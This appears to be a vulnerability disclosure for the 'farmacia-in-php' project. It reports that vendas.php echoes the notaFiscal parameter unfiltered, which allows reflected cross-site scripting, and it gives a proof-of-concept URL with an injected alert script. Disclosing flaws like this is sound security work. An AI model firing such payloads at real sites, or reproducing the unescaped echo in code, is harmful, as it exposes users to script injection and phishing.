# farmacia-in-php has Cross Site Scripting vulnerability in vendas.php

## supplier 
https://code-projects.org/farmacia-in-php-css-javascript-and-mysql-free-download/
## Vulnerability file
/vendas.php

## describe

The vulnerability of cross-site scripting attack in the system is vendas.php file. The parameter that can be controlled is: notaFiscal.Exploit vulnerabilities can be phishing

**Code analysis**    

echo notaFiscal value in no filter in vendas.php

```
        <input type="hidden" name="notaFiscal" value="<?php echo $_GET['notaFiscal']; ?>" />
```

![image-20241128203251872](https://github.com/user-attachments/assets/eff903f2-5f42-4847-ade7-8d190957ffc3)

## POC

The browser accesses this URL

```
http://farmacia/vendas.php?notaFiscal="/><script>alert('id_xss');</script>
```

**Result**

![image-20241128203358794](https://github.com/user-attachments/assets/fc28a2b3-6c01-411c-bc2c-21f5815a55eb)